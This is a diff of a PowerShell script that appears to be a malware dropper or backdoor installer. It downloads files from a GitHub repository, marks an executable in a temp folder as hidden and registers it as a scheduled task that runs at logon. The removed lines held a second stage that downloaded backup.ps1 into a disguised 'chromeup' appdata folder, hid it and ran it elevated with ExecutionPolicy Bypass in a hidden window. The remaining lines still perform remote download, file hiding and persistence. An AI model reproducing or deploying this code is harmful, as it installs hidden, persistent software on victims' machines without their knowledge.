@@ -13,29 +13,18 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/m
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libopus.dll" -OutFile libopus.dll
 
 
-#sets location appdata
-cd $env:appdata 
 
-#make new folder
-mkdir chromeup
-
-#cd into folder
-cd chromeup
-
-#cd into folder
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/backup.ps1" -OutFile backup.ps1
 
 #hide files
 $file = "$env:temp\sVBXKuz\wsappa.exe"
-$file2 = "$env:appdata\chromeup\backup.ps1"
+
 
 $attr = [System.IO.FileAttributes]::Hidden
 
 # Hide first file
 Set-ItemProperty -Path $file -Name Attributes -Value ((Get-Item $file).Attributes -bor $attr)
 
-# Hide second file
-Set-ItemProperty -Path $file2 -Name Attributes -Value ((Get-Item $file2).Attributes -bor $attr)
+
 
 $taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\wsappa.exe'
 $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
@@ -95,11 +84,7 @@ $taskXml = @"
   <Actions Context="Author">
     <Exec>
       <Command>C:\Users\$env:username\AppData\Local\Temp\sVBXKuz\wsappa.exe</Command>
-    </Exec>
-    <Exec>
-      <Command>powershell.exe</Command>
-      <Arguments>/c Start-Process powershell.exe -ArgumentList '-ExecutionPolicy','Bypass','-File', $env:appdata\chromeup\backup.ps1 -Verb runAs -WindowStyle Hidden</Arguments>
-    </Exec>
+    </Exec>    
   </Actions>
 </Task>
 "@
